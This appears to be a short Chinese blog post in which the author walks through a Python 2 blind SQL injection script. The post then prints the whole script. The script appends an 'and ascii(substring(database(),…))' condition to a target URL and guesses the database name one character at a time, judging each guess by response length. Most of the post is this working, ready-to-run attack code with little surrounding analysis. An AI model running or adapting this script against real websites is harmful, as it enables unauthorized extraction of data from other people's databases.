等呀等呀等，等到了晚上半夜，脚本终于写好了。然后我肯定是先读一遍源码学习一下啊。

![](../Images/0090f2bb5d1bbd33b0377dc46e634871.png)  
首先呢，它是把payload跟headers写在前面了

payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@\_.')

     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'

之后是利用了ascii函数进行猜解， and ascii(substring(database(),%s,1))=%s，然后%1匹配payload让它猜测。最后就把结果打印出来。

![](../Images/b6cfb3d5eddd53182be807c9bff636af.png)  
下面将是整个脚本：

#coding=utf-8  
import requests  
  
import sys  
  
  
  
reload(sys)  
  
sys.setdefaultencoding('utf-8')  
  
users=''  
  
payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@\_.')  
  
headers = {  
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'  
        }  
  
for i in range(1,8):  
  
    for payload in payloads:  
        try:  
  
            url = "http://a.com and ascii(substring(database(),%s,1))=%s" % (i,ord(payload))  
  
            result = requests.get(url,headers=headers).text  
            print u"\*",  
  
            if len(result) > 4000:  
                users += payload  
  
                print u'\\n∩▂∩:', users  
  
                break  
        except:  
            pass  
print '\\n\[Done\] User is:', users
